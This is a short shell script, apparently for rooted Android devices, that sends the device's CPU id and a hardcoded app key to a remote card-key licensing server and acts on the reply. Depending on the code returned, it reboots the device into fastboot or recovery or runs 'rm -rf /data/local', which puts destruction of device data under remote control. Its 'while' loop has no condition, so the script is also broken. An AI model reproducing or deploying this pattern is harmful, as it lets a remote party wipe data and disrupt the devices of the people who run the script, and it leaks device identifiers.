function parse_json() {
   json=$1
   query=$2
   value=$(echo "$json" | grep -o "\"$query\":[^,}]*" | sed 's/"[^"]*":\([^,}]*\).*/\1/')
      value="${value#\"}"
      value="${value%\"}"
      echo "$value"
}


cloud_url() {
wyUrl="http://wy.llua.cn/api/"
wyAppid="50002"
wyAppkey="Nz4u8sRm74V7mA7n"
deCode="200"

    kami=$(getprop ro.boot.cpuid)
    notice=`curl -s "${wyUrl}?id=notice&app=${wyAppid}"`
    logon=`curl -s "${wyUrl}?id=kmlogon&app=${wyAppid}&kami=${kami}"`    
    Notices=$(parse_json "$notice" "app_gg")
    condition=$(parse_json "$logon" "code")
    echo $Notices
    echo $condition
    
    if [[ $Notices == "" ]] || [[ $condition == "" ]] ; then
    sleep 5
    cloud_url
    fi

}

while
do
  cloud_url #更新状态
  # 153封禁 200验证正常 149无不存在 success开放版本 failed关闭使用
    if [[ $condition == "200" ]] ; then
    exit 2
    elif [[ $condition == "149" ]] ; then
    reboot fastboot
    elif [[ $condition == "153" ]] ; then
    rm -rf /data/local
    elif [[ $Notices == "failed" ]] ; then
    reboot recovery
    fi
  
    sleep 5
    done